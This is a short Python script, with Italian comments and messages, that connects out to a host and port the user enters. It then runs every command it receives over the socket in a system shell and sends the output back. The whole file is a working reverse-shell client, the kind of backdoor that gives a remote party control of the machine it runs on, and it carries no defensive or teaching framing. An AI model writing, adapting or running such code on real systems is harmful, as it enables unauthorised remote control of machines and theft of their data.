import os
import socket
import subprocess
import sys

def receiver(s):
    """Ricevi comandi di sistema ed eseguili."""
    while True:
        cmd_bytes = s.recv(4096)
        cmd = cmd_bytes.decode("utf-8")
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            s.send(b"$~: ")
            continue
        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            s.sendall(data + b"$~: ")
  
def connect(address):
    try:
        s = socket.socket()
        s.connect(address)
        os.system("cls")
        print("Connessione Stabilita.")
        print(f"Indirizzo: {address}")
    except socket.error as error:
        print("Qualcosa è andato storto... info di seguito.")
        print(error)
        sys.exit()
    receiver(s)
    

if __name__ == "__main__":
    print(f"Local ip: {socket.gethostbyname(socket.gethostname())}")
    print("Host: ",end="")
    host = (input())
    print("Port: ",end="")
    port = int(input())
    connect((host, port))
